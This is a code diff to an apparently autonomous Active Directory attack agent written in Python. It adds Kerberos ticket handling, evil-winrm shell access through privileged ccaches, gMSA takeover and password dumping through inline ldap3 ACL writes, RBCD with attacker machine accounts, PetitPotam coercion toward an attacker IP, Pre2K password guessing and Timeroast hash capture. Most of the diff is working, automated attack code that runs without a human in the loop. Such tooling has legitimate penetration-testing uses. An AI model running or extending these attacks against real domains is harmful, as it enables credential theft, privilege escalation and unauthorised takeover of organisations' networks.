-            _sp.run(f"echo '{dc_ip} {dc_fqdn} {domain}' | sudo tee -a /etc/hosts",
+            _sp.run(f"echo '{dc_ip} {dc_fqdn} {domain}' | sudo -n tee -a /etc/hosts",
                     shell=True, capture_output=True)
     except Exception:
         pass
@@ -6358,14 +6558,16 @@ def tool_request_tgt(dc_ip: str, domain: str, username: str,
     # If all fail we use faketime with LDAP currentTime offset instead of stepping.
     sync_out = ""
 
-    # NTP-based sync (UDP 123) — may be firewalled in real corporate networks
+    # NTP-based sync (UDP 123) — may be firewalled in real corporate networks.
+    # Use sudo -n so autonomous agent runs never block on an interactive
+    # password prompt; if sudo is unavailable, fall back to faketime below.
     for sync_cmd in [
-        f"sudo ntpdate -u {dc_fqdn}",
-        f"sudo ntpdate -u {dc_ip}",
-        f"sudo ntpdig -S {dc_fqdn}",
-        f"sudo ntpdig -S {dc_ip}",
-        f"sudo chronyd -q 'server {dc_fqdn} iburst'",
-        f"sudo chronyd -q 'server {dc_ip} iburst'",
+        f"sudo -n ntpdate -u {dc_fqdn}",
+        f"sudo -n ntpdate -u {dc_ip}",
+        f"sudo -n ntpdig -S {dc_fqdn}",
+        f"sudo -n ntpdig -S {dc_ip}",
+        f"sudo -n chronyd -q 'server {dc_fqdn} iburst'",
+        f"sudo -n chronyd -q 'server {dc_ip} iburst'",
     ]:
         r = _run(f"{sync_cmd} 2>&1", timeout=8)
         if r and "error" not in r.lower() and "no eligible" not in r.lower() and "TIMEOUT" not in r:
@@ -6428,8 +6630,9 @@ def tool_request_tgt(dc_ip: str, domain: str, username: str,
         tgt_result = f"getTGT.py failed: {tgt_out[:200]}"
         # Fallback: kinit
         kinit_out = _run(
-            f"KRB5_CONFIG={conf_path} KRB5CCNAME={ccache} "
-            f"echo '{password}' | kinit {username}@{realm} 2>&1",
+            f"printf '%s\\n' '{password}' | "
+            f"env KRB5_CONFIG={conf_path} KRB5CCNAME={ccache} "
+            f"kinit {username}@{realm} 2>&1",
             timeout=15)
         tgt_result += f" | kinit: {kinit_out[:150]}"
 
@@ -6486,7 +6689,18 @@ def tool_evil_winrm(dc_ip: str, domain: str, username: str,
     krb = _session_kerberos_usable(username, domain)
     use_krb_auth = False
 
-    if nt_hash:
+    # ADCS/ESC13 first: when a verified privileged ccache exists, the WinRM right
+    # lives ONLY in that ticket's PAC — the NT hash (UnPAC of the same user) is
+    # unprivileged. So prefer Kerberos with the *_adcs ccache before the NT-hash
+    # branch, and don't let a clobbered SESSION['krb5_ccache'] downgrade us.
+    _priv_cc = _active_priv_ccache(username, domain)
+    if _priv_cc:
+        use_krb_auth = True
+        ccache = _priv_cc
+        os.environ["KRB5CCNAME"] = ccache
+        connect_cmd = f"evil-winrm -i {fqdn} -r {realm} -K {ccache}"
+        nxc_auth    = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
+    elif nt_hash:
         nt = nt_hash
         connect_cmd = f"evil-winrm -i {target} -u '{username}' -H '{nt}'"
         nxc_auth    = f"-u '{username}' -H '{nt}' -d {domain}"
@@ -6537,13 +6751,46 @@ def tool_evil_winrm(dc_ip: str, domain: str, username: str,
         test = _nxc(f"winrm {host} {nxc_auth}", timeout=20)
         access_confirmed = "Pwn3d!" in test
 
+    # Additive Kerberos fallback (ESC13 / PAC-injected group membership):
+    # An NT hash or password authenticates the *account*, but ADCS ESC13's
+    # privilege (e.g. an OID->group link granting Remote Management Users) lives
+    # ONLY in the Kerberos TGT's PAC, never in the NT hash. So when the NTLM/hash
+    # or password probe above did NOT confirm access yet a usable Kerberos ccache
+    # exists, retry the probe over Kerberos with evil-winrm before giving up.
+    # Purely additive: never runs when access is already confirmed, so cases
+    # where NTLM works are completely unaffected. Target-agnostic — keys only off
+    # "a ccache is available and NTLM didn't get us in".
+    if (not access_confirmed) and (not use_krb_auth) and krb and SESSION.get("krb5_ccache"):
+        ccache = SESSION["krb5_ccache"]
+        os.environ["KRB5CCNAME"] = ccache
+        krb_probe = (
+            f"printf 'whoami\\nhostname\\nexit\\n' | "
+            f"timeout 25 {ewrm_bin} -i {shell_quote(fqdn)} "
+            f"-r {shell_quote(realm)} -K {shell_quote(ccache)} 2>&1"
+        )
+        _record_agent_command(krb_probe)
+        krb_test = _run(krb_probe, timeout=30)
+        krb_ok = any(s in krb_test for s in (
+            "PS C:\\", "Evil-WinRM PS", "Evil-WinRM shell",
+            f"{domain.split('.')[0].upper()}\\", f"{domain.split('.')[0].lower()}\\",
+        ))
+        if not krb_ok and "Evil-WinRM" in krb_test and "Error" not in krb_test[:200]:
+            krb_ok = True
+        if krb_ok:
+            use_krb_auth = True
+            access_confirmed = True
+            host = fqdn
+            test = krb_test
+            connect_cmd = f"evil-winrm -i {fqdn} -r {realm} -K {ccache}"
+
     if access_confirmed:
         add_finding("WinRM Shell Access Confirmed", "Critical",
                     f"WinRM access: {username}@{host}",
-                    "Restrict WinRM; audit Remote Management Users group")
-        SESSION["owned_machines"].append(
-            {"machine": host, "user": username, "method": "WinRM (Kerberos)" if use_krb_auth else "WinRM",
-             "time": datetime.now().isoformat()})
+                    "Restrict WinRM; audit Remote Management Users group",
+                    proof_level="owned")
+        _add_owned_machine(host, user=username, nt_hash=nt_hash,
+                           method="WinRM (Kerberos)" if use_krb_auth else "WinRM",
+                           time=datetime.now().isoformat())
         save_session()
 
     # Step 2: Collect recon output
@@ -6593,25 +6840,20 @@ def tool_kerbrute_enum(dc_ip: str, domain: str,
                        threads: str = "50") -> str:
     """Enumerate valid AD users via Kerberos (port 88) — no credentials required.
     Works even when NTLM is disabled. Valid users returned for AS-REP roasting."""
-    # Preferred username wordlists in priority order
+    # Preferred username wordlists in priority order (smaller lists first to avoid timeout)
     USERNAME_WORDLISTS = [
-        "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
         "/usr/share/seclists/Usernames/Names/names.txt",
-        "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
         "/usr/share/wordlists/seclists/Usernames/Names/names.txt",
+        "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+        "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
     ]
-    # Reject known password wordlists that will time-out (> 50 MB or known paths)
-    PASSWORD_WORDLISTS = {"rockyou", "rockyou.txt", "passwords", "darkweb2017", "10-million-password"}
-    wl_name = Path(wordlist).name.lower()
-    is_password_list = any(pw in wl_name for pw in PASSWORD_WORDLISTS)
-
-    if is_password_list or not Path(wordlist).exists():
-        # Fall through to priority list
-        wordlist = ""
-        for candidate in USERNAME_WORDLISTS:
-            if Path(candidate).exists():
-                wordlist = candidate
-                break
+    # Always use the priority list (smallest first) to avoid 120 s timeout.
+    # The default parameter is kept only for API compatibility — it is ignored.
+    wordlist = ""
+    for candidate in USERNAME_WORDLISTS:
+        if Path(candidate).exists():
+            wordlist = candidate
+            break
     if not wordlist:
         return ("Wordlist not found. Install: sudo apt install seclists\n"
                 "Or provide path to a usernames wordlist (not a password list)")
@@ -6702,7 +6944,15 @@ def tool_bloodyad(dc_ip: str, domain: str, username: str,
     cmd = f"{shell_quote(_bin('bloodyAD'))} {auth} {action}"
     if target:   cmd += f" '{target}'"
     if attribute: cmd += f" {attribute}"
-    if value:    cmd += f" -v '{value}'"
+    if value:
+        # Only `set object` consumes the value via -v; other actions
+        # (add/remove groupMember, set password, add rbcd, ...) take it
+        # as a positional argument. Passing -v to them makes bloodyAD parse
+        # it as the global verbosity flag and abort with "unrecognized -v".
+        if action.strip().lower().startswith("set object"):
+            cmd += f" -v '{value}'"
+        else:
+            cmd += f" '{value}'"
 
     try:
         r = subprocess.run(f"{_faketime_prefix()}{cmd}", shell=True, capture_output=True, text=True,
@@ -6925,26 +7175,79 @@ def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
     if not target_gmsa.endswith("$"):
         target_gmsa += "$"
 
-    # ── Pre-flight: choose READER + resolve its SID ───────────────────────────
-    reader = _gmsa_pick_reader(domain, dc_ip, username, password, nt_hash)
+    # ── Pre-flight: choose WRITER + READER ───────────────────────────────────
+    # WRITER = principal that has the GenericWrite ACL on the gMSA.
+    # Prefer intel valid_creds whose user matches an acl_paths entry for this gMSA.
+    # Fall back to the current session user.
+    intel = _agent_intel()
+    writer_user = username
+    writer_pw   = _real_secret(password)
+    writer_hash = _real_nt_hash(nt_hash)
+    writer_kerb = _session_kerberos_usable(username, domain)
+
+    gmsa_base = target_gmsa.rstrip("$").lower() if target_gmsa else ""
+    for right, t in intel.get("acl_paths", []):
+        t_str = _canonical_acl_target(t).rstrip("$").lower()
+        if t_str == gmsa_base and re.search(
+            r"GenericWrite|GenericAll|WriteDACL|WriteDacl|WriteOwner|WriteProperty",
+            str(right), re.I,
+        ):
+            # Look for this ACL holder in valid_creds
+            acl_holder = None
+            for edge in intel.get("acl_paths", []):
+                if len(edge) >= 2:
+                    edge_right, edge_target = edge[0], edge[1]
+                    if _canonical_acl_target(edge_target).rstrip("$").lower() == gmsa_base:
+                        break
+            # Try to match acl_paths source with valid_creds
+            for c in intel.get("valid_creds", []):
+                u = c.get("user", "")
+                pw = _real_secret(c.get("password", ""))
+                if u and pw and u.lower() != username.lower():
+                    # Check if this user has write on this gMSA
+                    for r2, t2 in intel.get("acl_paths", []):
+                        t2_str = _canonical_acl_target(t2).rstrip("$").lower()
+                        if (t2_str == gmsa_base
+                                and re.search(r"GenericWrite|GenericAll|WriteDACL|WriteOwner|WriteProperty", str(r2), re.I)):
+                            acl_holder = c
+                            break
+                    if acl_holder:
+                        break
+            if acl_holder:
+                writer_user = acl_holder["user"]
+                writer_pw   = _real_secret(acl_holder.get("password", ""))
+                writer_hash = _real_nt_hash(acl_holder.get("nt_hash", ""))
+                writer_kerb = False
+            break
+
+    reader = _gmsa_pick_reader(domain, dc_ip, writer_user, writer_pw, writer_hash)
+    if not reader:
+        # Fall back to session user reader
+        reader = _gmsa_pick_reader(domain, dc_ip, username, password, nt_hash)
     if not reader:
         return (f"gMSA takeover failed: could not resolve a reader SID. "
                 f"Run enumerate_ldap to confirm credentials are accepted.")
 
+    # ── Pre-fetch writer TGT (handles Protected Users / Kerberos-only accounts) ─
+    writer_ccache = ""
+    if writer_pw and not writer_kerb:
+        writer_ccache = _getTGT(writer_user, writer_pw, domain, dc_ip)
+        if writer_ccache:
+            writer_kerb = True
+
     # ── Path A: ldap3-based atomic write+dump (preferred) ─────────────────────
-    helper = Path(__file__).parent.parent / "tools" / "bin" / "gmsa_grant_and_dump.py"
+    helper = Path(__file__).parent.parent.parent / "tools" / "bin" / "gmsa_grant_and_dump.py"
     helper_out = ""
     helper_rc  = -1
     if helper.exists():
         # FQDN required for GSSAPI SPN lookup.
         dc_fqdn = (_dc_host_for_kerberos(domain, dc_ip) or dc_ip).strip()
         krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn)
-        writer_pw = _real_secret(password)
-        writer_hash = _real_nt_hash(nt_hash)
-        writer_kerb = _session_kerberos_usable(username, domain)
 
         env = os.environ.copy()
-        if writer_kerb:
+        if writer_ccache:
+            env["KRB5CCNAME"] = writer_ccache
+        elif writer_kerb:
             env["KRB5CCNAME"] = SESSION["krb5_ccache"]
         if krb5_conf:
             env["KRB5_CONFIG"] = krb5_conf
@@ -6955,18 +7258,17 @@ def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
         argv += [_SYSPY, str(helper),
                  "--dc", dc_fqdn, "--domain", domain,
                  "--gmsa", target_gmsa.rstrip("$"),
-                 "--writer-user", username,
+                 "--writer-user", writer_user,
                  "--reader-user", reader["user"],
                  "--grantee-sid", reader["sid"]]
 
-        # Prefer concrete secrets over Kerberos here. Expired ccaches are common
-        # after time-skew fixes and cause GSSAPI to fail before the ACL write.
-        if writer_hash and not writer_pw:
+        # Prefer Kerberos ccache when available (handles Protected Users accounts)
+        if writer_ccache or writer_kerb:
+            argv.append("--writer-kerberos")
+        elif writer_hash and not writer_pw:
             argv += ["--writer-hash", writer_hash]
         elif writer_pw:
             argv += ["--writer-pass", writer_pw]
-        elif writer_kerb:
-            argv.append("--writer-kerberos")
         else:
             argv = []
 
@@ -7021,24 +7323,77 @@ def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
             _prefetch_ldap_tgs(domain, dc_ip,
                                _dc_host_for_kerberos(domain, dc_ip))
         sddl = f"O:BAG:BAD:(A;;RPWP;;;{reader['sid']})"
-        bauth, benv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
-        if bauth:
-            write_cmd = (
-                f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bauth} set object "
-                f"{shell_quote(target_gmsa)} msDS-GroupMSAMembership "
-                f"-v {shell_quote(sddl)} --raw"
-            )
+        dc_fqdn = (_dc_host_for_kerberos(domain, dc_ip) or dc_ip).strip()
+
+        # ── ldap3 inline write (avoids bloodyAD asyncio crash on Python 3.13) ──
+        active_ccache = writer_ccache or (SESSION.get("krb5_ccache", "") if writer_kerb else "")
+        ldap3_script = (
+            "import sys,os,ldap3\n"
+            "from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR,ACCESS_ALLOWED_ACE,ACL,LDAP_SID\n"
+            f"os.environ['KRB5CCNAME']=r'{active_ccache}'\n"
+            f"srv=ldap3.Server('{dc_fqdn}',port=636,use_ssl=True,get_info=ldap3.ALL)\n"
+            f"conn=ldap3.Connection(srv,authentication=ldap3.SASL,sasl_mechanism=ldap3.KERBEROS,auto_bind=True)\n"
+            f"base_dn='DC='+'DC='.join('{domain}'.split('.'))\n"
+            f"conn.search(base_dn,'(sAMAccountName={target_gmsa})',attributes=['distinguishedName'])\n"
+            "dn=conn.entries[0].distinguishedName.value if conn.entries else sys.exit(1)\n"
+            "sd=SR_SECURITY_DESCRIPTOR();sd['Revision']=1;sd['Sbz1']=0;sd['Control']=0x8004\n"
+            "sd['OffsetOwner']=0;sd['OffsetGroup']=0;sd['OffsetSacl']=0\n"
+            "acl=ACL();acl['AclRevision']=4;acl['Sbz1']=0;acl['Sbz2']=0\n"
+            "ace=ACCESS_ALLOWED_ACE();ace['AceType']=0;ace['AceFlags']=0\n"
+            f"sid=LDAP_SID();sid.fromCanonical('{reader['sid']}')\n"
+            "ace['Ace']['Sid']=sid;ace['Ace']['Mask']=0x30\n"
+            "acl['Data']=ace.getData();acl['AclSize']=len(acl['Data'])+8;acl['AceCount']=1\n"
+            "sd['Dacl']=acl\n"
+            "ok=conn.modify(dn,{'msDS-GroupMSAMembership':[(ldap3.MODIFY_REPLACE,[sd.getData()])]})\n"
+            "print('WRITE-OK' if ok else 'WRITE-FAIL',conn.result)\n"
+        )
+        ldap3_write_out = ""
+        if active_ccache:
             try:
-                wr = subprocess.run(write_cmd, shell=True, capture_output=True,
-                                    text=True, timeout=30, env=benv)
-                legacy_out += "--- bloodyAD write ---\n"
-                legacy_out += _strip_ansi((wr.stdout + wr.stderr).strip())[:400] + "\n"
+                lw = subprocess.run(
+                    [_SYSPY, "-c", ldap3_script],
+                    capture_output=True, text=True, timeout=20,
+                    env={**os.environ, "KRB5CCNAME": active_ccache},
+                )
+                ldap3_write_out = _strip_ansi((lw.stdout + lw.stderr).strip())
+                legacy_out += f"--- ldap3 inline write ---\n{ldap3_write_out[:400]}\n"
+                if "WRITE-OK" in ldap3_write_out:
+                    write_done = True
             except Exception as e:
-                legacy_out += f"--- bloodyAD write ---\n[ERROR] {e}\n"
+                legacy_out += f"--- ldap3 inline write ---\n[ERROR] {e}\n"
+
+        # ── bloodyAD write (fallback when ldap3 inline fails) ─────────────────
+        if not write_done:
+            bauth, benv = _bloodyad_auth(domain, writer_user, writer_pw, writer_hash, dc_ip)
+            if not bauth:
+                bauth, benv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
+            if bauth:
+                if writer_ccache:
+                    benv["KRB5CCNAME"] = writer_ccache
+                for raw_flag in ("", " --raw"):
+                    write_cmd = (
+                        f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bauth} set object "
+                        f"{shell_quote(target_gmsa)} msDS-GroupMSAMembership "
+                        f"-v {shell_quote(sddl)}{raw_flag}"
+                    )
+                    try:
+                        wr = subprocess.run(write_cmd, shell=True, capture_output=True,
+                                            text=True, timeout=30, env=benv)
+                        wr_out = _strip_ansi((wr.stdout + wr.stderr).strip())
+                        if wr.returncode == 0 or any(s in wr_out.lower() for s in (
+                            "success", "modified", "write-ok", "insufficientaccessrights",
+                            "constraintviolation", "unwillingtoperform",
+                        )):
+                            legacy_out += f"--- bloodyAD write{raw_flag} ---\n{wr_out[:400]}\n"
+                            break
+                        legacy_out += f"--- bloodyAD write{raw_flag} (rc={wr.returncode}) ---\n{wr_out[:300]}\n"
+                    except Exception as e:
+                        legacy_out += f"--- bloodyAD write ---\n[ERROR] {e}\n"
+                        break
 
         # Try gMSADumper.py as second dump method.
         candidate_paths = [
-            Path(__file__).parent.parent / "tools" / "bin" / "gMSADumper.py",
+            Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
             Path("/usr/local/bin/gMSADumper.py"),
         ]
         dumper = next((str(p) for p in candidate_paths if p.exists()), "")
@@ -7141,10 +7496,37 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
     Requires: ReadGMSAPassword ACL on the gMSA object."""
     password = _real_secret(password)
     nt_hash = _real_nt_hash(nt_hash)
+    intel = SESSION.setdefault("agent_intel", {})
+    tried_for = intel.setdefault("gmsa_read_tried_for", [])
+    if username and not any(_same_ad_account(username, seen) for seen in tried_for):
+        tried_for.append(username)
+    pivot_ccache = ""
+    for cred in intel.get("valid_creds", []) or []:
+        if not isinstance(cred, dict):
+            continue
+        if not _same_ad_account(username, str(cred.get("user", ""))):
+            continue
+        cc = str(cred.get("ccache", "") or "")
+        if cc and _ccache_is_valid(cc, username, domain):
+            pivot_ccache = cc
+            break
+    if pivot_ccache:
+        SESSION["use_kerberos"] = True
+        SESSION["krb5_ccache"] = pivot_ccache
+        os.environ["KRB5CCNAME"] = pivot_ccache
+        password = ""
+        nt_hash = ""
     auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
-    # nxc ldap --gmsa
+    # nxc ldap --gmsa (try LDAP first, then LDAPS on channel-binding errors)
     nxc_host = _dc_host_for_kerberos(domain, dc_ip) if _session_kerberos_usable(username, domain) and not (password or nt_hash) else dc_ip
     out1 = _nxc(f"ldap {shell_quote(nxc_host)} {auth} --gmsa", timeout=30)
+    # Channel binding error (data 576 / 80090346) → retry on LDAPS port 636
+    if any(s in out1.lower() for s in ("80090346", "data 576", "channel binding")):
+        out1_ldaps = _nxc(f"ldap {shell_quote(nxc_host)} {auth} --gmsa --port 636", timeout=30)
+        if out1_ldaps and "error" not in out1_ldaps.lower():
+            out1 = out1_ldaps
+        else:
+            out1 += f"\n=== LDAPS retry ===\n{out1_ldaps[:400]}"
     # Also try via bloodyAD
     bloodyauth, bloodyenv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
     if bloodyauth:
@@ -7173,7 +7555,7 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
     dump_out = ""
     if not _extract_gmsa_hashes_from_text(f"{out1}\n{out2}"):
         dumper = next((str(p) for p in (
-            Path(__file__).parent.parent / "tools" / "bin" / "gMSADumper.py",
+            Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
             Path("/usr/local/bin/gMSADumper.py"),
         ) if p.exists()), "")
         if dumper:
@@ -7242,7 +7624,7 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
 
             dump_k = ""
             dumper = next((str(p) for p in (
-                Path(__file__).parent.parent / "tools" / "bin" / "gMSADumper.py",
+                Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
                 Path("/usr/local/bin/gMSADumper.py"),
             ) if p.exists()), "")
             if dumper:
@@ -7321,6 +7703,22 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
         results.append(f"HASHES: {hashes}")
         acct, nt = hashes[0]
         results.append(f"NEXT: evil_winrm with username={acct} nt_hash={nt}")
+    else:
+        # No readable managed password for this principal — covers ALL no-result
+        # modes, including "<no read permissions>" (a SUCCESSFUL query that yields
+        # nothing usable, not a bind error, so the auth-denial branch above never
+        # fires). Mark gmsa_read dead for this user so the rule engine pivots
+        # instead of re-selecting gmsa_read every round (infinite loop). Generic.
+        dead = SESSION.setdefault("agent_intel", {}).setdefault("gmsa_read_dead_for", [])
+        if not any(_same_ad_account(username, d) for d in dead):
+            dead.append(username)
+            save_session()
+        results.append(
+            "[gmsa_read dead-path] No readable gMSA managed password for this "
+            "principal — marking gmsa_read dead. Pivot to a principal allowed to "
+            "read it (per the gMSA's PrincipalsAllowedToReadPassword), or use "
+            "gmsa_takeover if a write edge exists."
+        )
     return "\n\n".join(results)
 
 
@@ -7561,11 +7959,33 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
         "successfully added", "account created", "added machine account",
     ))
     if add_failed and not add_succeeded:
-        results.append(
-            "RBCD stopped: attacker computer account was not created, "
-            "so rbcd.py/getST would fail with a non-existent machine account."
-        )
-        return "\n\n".join(results)
+        # Fallback: try LDAPS method (works when SMB/SAMR is blocked)
+        results.append("[*] SMB addcomputer failed — retrying with -method LDAPS...")
+        if krb and ccache:
+            add_cmd_ldaps = (f"{krb_env}{addcomp_py} "
+                             f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                             f"-computer-name {shell_quote(attacker_computer)} "
+                             f"-computer-pass {shell_quote(attacker_pass)} "
+                             f"-method LDAPS "
+                             f"-k -no-pass {shell_quote(f'{domain}/{username}')}")
+        else:
+            pw = _real_secret(password)
+            add_cmd_ldaps = (f"{addcomp_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                             f"-computer-name {shell_quote(attacker_computer)} "
+                             f"-computer-pass {shell_quote(attacker_pass)} "
+                             f"-method LDAPS "
+                             f"{shell_quote(f'{domain}/{username}:{pw}')}")
+        out_ldaps = _run(add_cmd_ldaps, timeout=30)
+        results.append(f"=== Step 1b: Add attacker computer (LDAPS) ===\n{out_ldaps[:600]}")
+        add_succeeded = any(s in out_ldaps.lower() for s in (
+            "successfully added", "account created", "added machine account",
+        ))
+        if not add_succeeded:
+            results.append(
+                "RBCD stopped: attacker computer account was not created via SMB or LDAPS. "
+                "MAQ may be 0 or account lacks rights to add computers."
+            )
+            return "\n\n".join(results)
 
     # Step 2: Set RBCD via bloodyAD or rbcd.py
     rbcd_py = _impacket_cmd("rbcd")
@@ -7614,12 +8034,12 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
 
 
 def tool_coercion_attack(dc_ip: str, domain: str, username: str,
-                          password: str = "", nt_hash: str = "",
-                          attacker_ip: str = "", method: str = "auto") -> str:
+                         password: str = "", nt_hash: str = "",
+                         attacker_ip: str = "", method: str = "auto") -> str:
     """Coercion attack: PetitPotam / PrinterBug to force DC to authenticate
     to attacker. Captures Net-NTLMv2 or relays to LDAP for Shadow Credentials.
     method: auto | petitpotam | printerbug | dfscoerce"""
-    attacker_ip = attacker_ip or SESSION.get("attacker_ip", "")
+    attacker_ip = attacker_ip or _attacker_ip()
     if not attacker_ip:
         return "Coercion skipped: attacker_ip required (your listener IP)"
 
@@ -7632,7 +8052,7 @@ def tool_coercion_attack(dc_ip: str, domain: str, username: str,
     petitpotam_py = _find_file("PetitPotam.py", [
         os.path.expanduser("~/.local/bin/PetitPotam.py"),
         "/opt/PetitPotam/PetitPotam.py",
-        str(Path(__file__).parent.parent / "tools" / "PetitPotam.py"),
+        str(Path(__file__).resolve().parents[2] / "tools" / "PetitPotam" / "PetitPotam.py"),
     ])
     printerbug_py = _find_file("printerbug.py", [
         os.path.expanduser("~/.local/bin/printerbug.py"),
@@ -7670,7 +8090,7 @@ def tool_coercion_attack(dc_ip: str, domain: str, username: str,
             "  git clone https://github.com/topotam/PetitPotam\n"
             "\nManual commands:\n"
             f"  coercer coerce -l {attacker_ip} -t {dc_ip} -u '{username}' -p '<pass>' -d {domain}\n"
-            f"  python3 PetitPotam.py {attacker_ip} {dc_ip} {domain}/{username}:<pass>"
+            f"  python3 tools/PetitPotam/PetitPotam.py {attacker_ip} {dc_ip} {domain}/{username}:<pass>"
         )
 
     add_finding("Coercion Attack Attempted", "High",
@@ -7742,8 +8162,14 @@ def tool_pre2k_attack(dc_ip: str, domain: str, username: str = "",
     if pre2k_bin or Path(pre2k_py).exists():
         bin_to_use = pre2k_bin or f"{sys.executable} {pre2k_py}"
         pw = _real_secret(password)
-        auth = f"-u {shell_quote(username)} -p {shell_quote(pw)} -d {shell_quote(domain)}" if pw else f"-d {shell_quote(domain)}"
-        cmd = f"timeout 60 {bin_to_use} unauth {auth} -dc-ip {shell_quote(dc_ip)} 2>&1"
+        # pre2k: 'auth' alt komutu -u/-p kabul eder, 'unauth' sadece -d alır
+        if pw and username:
+            subcmd = "auth"
+            auth = f"-u {shell_quote(username)} -p {shell_quote(pw)} -d {shell_quote(domain)}"
+        else:
+            subcmd = "unauth"
+            auth = f"-d {shell_quote(domain)}"
+        cmd = f"timeout 60 {bin_to_use} {subcmd} {auth} -dc-ip {shell_quote(dc_ip)} 2>&1"
         out = _run(cmd, timeout=65)
         results.append(f"=== Pre2K Scan ===\n{out[:2000]}")
         for m in re.finditer(r"VALID(?:\s+CREDENTIALS)?\s*:\s*(?:[A-Za-z0-9_.-]+\\)?([A-Za-z0-9_.-]+\$):([^\s]+)", out, re.I):
@@ -7756,6 +8182,7 @@ def tool_pre2k_attack(dc_ip: str, domain: str, username: str = "",
 
     if not valid:
         candidates = _known_computer_accounts()
+        legacy_candidates: set[str] = set()
         if not candidates and _real_secret(password) and username:
             base_dn = "DC=" + domain.replace(".", ",DC=")
             ldap_cmd = (
@@ -7767,6 +8194,24 @@ def tool_pre2k_attack(dc_ip: str, domain: str, username: str = "",
             results.append(f"=== Computer candidates from LDAP ===\n{ldap_out[:1000]}")
             for m in re.finditer(r"sAMAccountName:\s*([A-Za-z0-9_.-]+\$)", ldap_out, re.I):
                 sam = m.group(1).upper()
+                if sam not in candidates:
+                    candidates.append(sam)
+
+        if _real_secret(password) and username:
+            base_dn = "DC=" + domain.replace(".", ",DC=")
+            legacy_cmd = (
+                f"ldapsearch -x -H ldap://{shell_quote(dc_ip)} "
+                f"-D {shell_quote(username + '@' + domain)} -w {shell_quote(_real_secret(password))} "
+                f"-b {shell_quote(base_dn)} "
+                "'(&(objectClass=computer)(userAccountControl=4128))' "
+                "sAMAccountName 2>/dev/null"
+            )
+            legacy_out = _run(legacy_cmd, timeout=20)
+            if legacy_out.strip():
+                results.append(f"=== Legacy Pre2K computer candidates (UAC=4128) ===\n{legacy_out[:1000]}")
+            for m in re.finditer(r"sAMAccountName:\s*([A-Za-z0-9_.-]+\$)", legacy_out, re.I):
+                sam = m.group(1).upper()
+                legacy_candidates.add(sam)
                 if sam not in candidates:
                     candidates.append(sam)
 
@@ -7785,6 +8230,21 @@ def tool_pre2k_attack(dc_ip: str, domain: str, username: str = "",
                 results.append(f"[VALID] {domain}\\{sam}:{guess}")
             elif "STATUS_ACCOUNT_DISABLED" in check:
                 results.append(f"[disabled] {sam}:{guess}")
+            elif sam in legacy_candidates:
+                cc = _getTGT(sam, guess, domain, dc_ip)
+                if cc and _ccache_is_valid(cc, sam, domain):
+                    cred = {
+                        "user": sam,
+                        "password": guess,
+                        "source": "pre2k-kerberos",
+                        "ccache": cc,
+                    }
+                    valid.append(cred)
+                    intel = SESSION.setdefault("agent_intel", {})
+                    ccaches = intel.setdefault("ccaches", [])
+                    if cc not in ccaches:
+                        ccaches.append(cc)
+                    results.append(f"[VALID-KRB] {domain}\\{sam}:{guess} ccache={cc}")
 
     if valid:
         add_finding("Pre-Windows 2000 Account", "Critical",
@@ -7811,12 +8271,42 @@ def tool_timeroast(dc_ip: str, domain: str, username: str = "",
     Unauthenticated — the NTP response is signed with the account's NT hash.
     Works against all Windows DCs; crack with hashcat -m 31300."""
     results = []
-    timeroast_py = shutil.which("timeroast.py") or os.path.expanduser("~/.local/bin/timeroast.py")
+
+    # Resolve timeroast.py from multiple locations
+    _timeroast_candidates = [
+        shutil.which("timeroast.py"),
+        os.path.expanduser("~/.local/bin/timeroast.py"),
+        "/usr/local/bin/timeroast.py",
+        "/opt/Timeroast/timeroast.py",
+        str(Path(__file__).resolve().parents[2] / "tools" / "bin" / "timeroast.py"),
+    ]
+    timeroast_py = next((p for p in _timeroast_candidates if p and Path(p).exists()), "")
+
+    # Auto-install via GitHub clone if not found (not on PyPI)
+    if not timeroast_py:
+        results.append("[*] timeroast.py not found — cloning from GitHub (SecuraBV/Timeroast)...")
+        local_bin = os.path.expanduser("~/.local/bin")
+        clone_dir = "/tmp/Timeroast"
+        clone_out = _run(
+            f"git clone --depth 1 https://github.com/SecuraBV/Timeroast {clone_dir} 2>&1"
+            if not Path(clone_dir).exists()
+            else f"git -C {clone_dir} pull --ff-only 2>&1",
+            timeout=60,
+        )
+        src = Path(clone_dir) / "timeroast.py"
+        if src.exists():
+            dest = Path(local_bin) / "timeroast.py"
+            Path(local_bin).mkdir(parents=True, exist_ok=True)
+            shutil.copy2(str(src), str(dest))
+            timeroast_py = str(dest)
+            results.append(f"[+] timeroast.py installed → {timeroast_py}")
+        else:
+            results.append(f"[-] GitHub clone output:\n{clone_out[:400]}")
 
     out_file = str(_runtime_path("timeroast_hashes.txt"))
-    if Path(timeroast_py).exists():
-        cmd = f"timeout 30 {shell_quote(sys.executable)} {shell_quote(timeroast_py)} {dc_ip} 2>&1"
-        out = _run(cmd, timeout=35)
+    if timeroast_py and Path(timeroast_py).exists():
+        cmd = f"timeout 60 {shell_quote(sys.executable)} {shell_quote(timeroast_py)} {dc_ip} 2>&1"
+        out = _run(cmd, timeout=65)
